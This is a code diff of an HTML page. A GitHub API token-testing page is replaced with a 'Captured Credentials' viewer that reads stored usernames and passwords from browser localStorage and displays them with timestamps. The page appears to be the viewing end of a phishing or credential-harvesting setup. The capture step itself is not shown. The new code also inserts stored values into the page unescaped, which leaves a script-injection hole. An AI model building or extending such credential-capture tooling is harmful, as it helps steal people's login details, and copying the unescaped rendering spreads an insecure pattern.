@@ -3,90 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test GitHub API</title>
+    <title>View Credentials (Local Storage Version)</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        .container { max-width: 800px; margin: 0 auto; }
-        .test-section { margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
-        input { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; }
-        button { background-color: #4CAF50; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; }
-        .result { margin-top: 10px; padding: 10px; border-radius: 4px; }
-        .success { background-color: #dff0d8; color: #3c763d; }
-        .error { background-color: #f2dede; color: #a94442; }
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .credential {
+            border: 1px solid #ddd;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        .credential p {
+            margin: 5px 0;
+        }
+        .credential strong {
+            color: #333;
+        }
+        .no-credentials {
+            text-align: center;
+            color: #666;
+            padding: 20px;
+        }
+        .refresh-btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        .refresh-btn:hover {
+            background-color: #45a049;
+        }
+        .header-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .credential-count {
+            color: #666;
+            font-size: 14px;
+        }
+        .clear-btn {
+            background-color: #d9534f;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .clear-btn:hover {
+            background-color: #c9302c;
+        }
+        .error-message {
+            color: #d9534f;
+            background-color: #f9f2f4;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 10px 0;
+            border: 1px solid #d9534f;
+        }
     </style>
 </head>
 <body>
+
 <div class="container">
-    <h1>GitHub API Test</h1>
-    
-    <div class="test-section">
-        <h3>Test 1: Basic API Access</h3>
-        <input type="text" id="token1" placeholder="Your GitHub Token">
-        <button onclick="testBasicAccess()">Test Basic Access</button>
-        <div id="result1"></div>
+    <h1>Captured Credentials</h1>
+    <div class="header-actions">
+        <div class="credential-count" id="credentialCount">Loading...</div>
+        <div>
+            <button class="refresh-btn" onclick="loadCredentials()">Refresh</button>
+            <button class="clear-btn" onclick="clearCredentials()">Clear All</button>
+        </div>
     </div>
-    
-    <div class="test-section">
-        <h3>Test 2: Gist Access</h3>
-        <input type="text" id="token2" placeholder="Your GitHub Token">
-        <input type="text" id="gistId" placeholder="Gist ID">
-        <button onclick="testGistAccess()">Test Gist Access</button>
-        <div id="result2"></div>
-    </div>
+    <div id="credentials"></div>
 </div>
 
 <script>
-function testBasicAccess() {
-    const token = document.getElementById('token1').value;
-    const resultDiv = document.getElementById('result1');
+    // Load credentials when the page loads
+    window.onload = function() {
+        loadCredentials();
+    };
     
-    resultDiv.innerHTML = '<div class="result">Testing...</div>';
+    function loadCredentials() {
+        const container = document.getElementById('credentials');
+        const countElement = document.getElementById('credentialCount');
+        
+        try {
+            // Get credentials from localStorage
+            let credentials = JSON.parse(localStorage.getItem('credentials') || '[]');
+            
+            // Update count
+            countElement.textContent = `${credentials.length} credential(s) captured`;
+            
+            if (credentials.length === 0) {
+                container.innerHTML = '<div class="no-credentials">No credentials captured yet.</div>';
+                return;
+            }
+            
+            container.innerHTML = '';
+            
+            // Display each credential in reverse order (newest first)
+            credentials.reverse().forEach((cred, index) => {
+                const credential = document.createElement('div');
+                credential.className = 'credential';
+                
+                // Format the timestamp for better readability
+                let formattedTime = cred.timestamp;
+                try {
+                    const date = new Date(cred.timestamp);
+                    formattedTime = date.toLocaleString();
+                } catch (e) {
+                    // Keep original if parsing fails
+                }
+                
+                credential.innerHTML = `
+                    <p><strong>Username:</strong> ${cred.username}</p>
+                    <p><strong>Password:</strong> ${cred.password}</p>
+                    <p><strong>Time:</strong> ${formattedTime}</p>
+                `;
+                
+                container.appendChild(credential);
+            });
+        } catch (error) {
+            console.error('Error loading credentials:', error);
+            container.innerHTML = `<div class="error-message">Error loading credentials: ${error.message}</div>`;
+            countElement.textContent = 'Error';
+        }
+    }
     
-    fetch('https://api.github.com/user', {
-        headers: {
-            'Authorization': `token ${token}`
+    function clearCredentials() {
+        if (confirm('Are you sure you want to clear all credentials? This action cannot be undone.')) {
+            localStorage.removeItem('credentials');
+            loadCredentials();
         }
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        return response.json();
-    })
-    .then(data => {
-        resultDiv.innerHTML = `<div class="result success">Success! Logged in as ${data.login}</div>`;
-    })
-    .catch(error => {
-        resultDiv.innerHTML = `<div class="result error">Error: ${error.message}</div>`;
-    });
-}
-
-function testGistAccess() {
-    const token = document.getElementById('token2').value;
-    const gistId = document.getElementById('gistId').value;
-    const resultDiv = document.getElementById('result2');
-    
-    resultDiv.innerHTML = '<div class="result">Testing...</div>';
-    
-    fetch(`https://api.github.com/gists/${gistId}`, {
-        headers: {
-            'Authorization': `token ${token}`
-        }
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        return response.json();
-    })
-    .then(data => {
-        const files = Object.keys(data.files);
-        resultDiv.innerHTML = `<div class="result success">Success! Found ${files.length} file(s): ${files.join(', ')}</div>`;
-    })
-    .catch(error => {
-        resultDiv.innerHTML = `<div class="result error">Error: ${error.message}</div>`;
-    });
-}
+    }
 </script>
+
 </body>
 </html>
